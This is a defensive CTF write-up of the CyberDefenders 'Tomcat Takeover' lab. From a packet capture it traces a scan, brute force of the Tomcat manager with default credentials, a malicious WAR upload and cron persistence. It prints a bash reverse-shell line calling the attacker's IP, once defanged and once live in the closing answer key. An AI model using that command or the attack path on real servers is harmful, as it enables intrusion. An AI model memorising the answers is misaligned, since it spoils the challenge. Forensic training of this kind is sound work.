---
layout: lab
title: Tomcat Takeover
platform: CyberDefenders
difficulty: Easy
category: Network Forensics
skill: Network Forensics
tools: Wireshark
tactics: "[Reconnaissance, Execution, Persistence, Privilege Escalation, Credential Access, Discovery, Command and Control]"
proof: https://cyberdefenders.org/blueteam-ctf-challenges/achievements/inksec/tomcat-takeover/
challenge_url: https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/
permalink: /blue-team/labs/tomcat-takeover/
summary: "\"Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise.\""
art: https://cyberdefenders.org/media/terraform/Tomcat%20Takeover/Tomcat_Takeover.webp
youtube: https://www.youtube.com/watch?v=4BKpp2tgKwM
---
#### Scenario

## Overview

A web server on the company intranet was flagged for suspicious activity. A PCAP was captured for analysis. The goal was to reconstruct the full attack chain — from initial reconnaissance through to persistence — against an Apache Tomcat web server.

---

## Investigation

### Identifying the Attacker

With only one external IP address present in the capture, the attacker was immediately identifiable. 
![tomcat_conversion.png](tomcat_conversion.png)
Geolocation placed the source IP in China.

**Attacker IP:** `14[.]0[.]0[.]120`
![tomcat_geolocation.png](tomcat_geolocation.png)

### Reconnaissance

Filtering by attacker IP and HTTP traffic revealed a port scan followed by directory enumeration activity consistent with Gobuster:
```
ip.addr == 14.0.0.120 && http
```
![tomcat_gobuster.png](tomcat_gobuster.png)
The scan uncovered several open ports. Port `8080` was identified as exposing the Tomcat admin panel.

---
### Directory Enumeration

HTTP stream analysis confirmed Gobuster was used to enumerate directories. The attacker successfully discovered the `/manager` endpoint — Tomcat's web application manager interface.

---

### Credential Brute Force

With the admin panel located, the attacker brute-forced credentials. The successful login was:

**Username:** `admin`  
**Password:** `tomcat`
![tomecat_auth.png](tomecat_auth.png)

---

### WAR File Upload / Reverse Shell

Following authentication to `/manager`, the attacker uploaded a malicious WAR file to deploy a reverse shell:

**Filename:** `JXQOZY.war`

HTTP stream analysis of the POST request confirmed the upload. Following the resulting TCP stream revealed the attacker's shell session.


![tomcat_shellupload.png](tomcat_shellupload.png)

---
### Persistence

After establishing the reverse shell, the attacker scheduled a cron job to maintain persistent access:

**Scheduled command:**

```
/bin/bash -c 'bash -i >& /dev/tcp/14[.]0[.]0[.]120/443 0>&1'
```

![tomcat_revshell.png](tomcat_revshell.png)

****
## MITRE ATT&CK

|Technique|ID|Description|
|---|---|---|
|Network Service Scanning|T1046|Port scan to identify open services|
|Brute Force|T1110|Credential brute-force against Tomcat manager|
|Deploy Container / Server Software|T1505.003|WAR file upload for server-side execution|
|Command and Scripting Interpreter: Unix Shell|T1059.004|Bash reverse shell|
|Scheduled Task/Job: Cron|T1053.003|Cron-based persistence|

---
## IOCs 

| Type             | Value                  |
| ---------------- | ---------------------- |
| Attacker IP      | `14[.]0[.]0[.]120`     |
| Attacker Country | China                  |
| Admin Port       | `8080`                 |
| Enumeration Tool | Gobuster               |
| Admin Directory  | `/manager`             |
| Credentials      | `admin:tomcat`         |
| Malicious File   | `JXQOZY.war`           |
| C2 Callback      | `14[.]0[.]0[.]120:443` |

## Lessons Learned

- Default Tomcat credentials (`admin:tomcat`) should be rotated immediately on deployment — this is a trivially guessable pair that any basic wordlist will crack
- The Tomcat manager interface (`/manager`) should never be exposed externally and should be restricted by IP allowlist
- WAR file upload capability should be disabled or locked down in production environments
- Cron persistence via reverse shell callback is a common post-exploitation step — scheduled task monitoring and outbound connection baselining would catch this

---

## References

[MITRE ATT&CK T1505.003 - Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/)


---

{% include flag.html question="Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?" answer="14.0.0.120" %}

{% include answer.html question="Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?" answer="china" %}

{% include flag.html question="From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?" answer="8080" %}

{% include answer.html question="Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?" answer="gobuster" %}

{% include flag.html question="After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?" answer="/manager" %}

{% include answer.html question="After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?" answer="admin:tomcat" %}

{% include flag.html question="Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?" answer="JXQOZY.war" %}

{% include answer.html question="After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?" answer="/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" %}
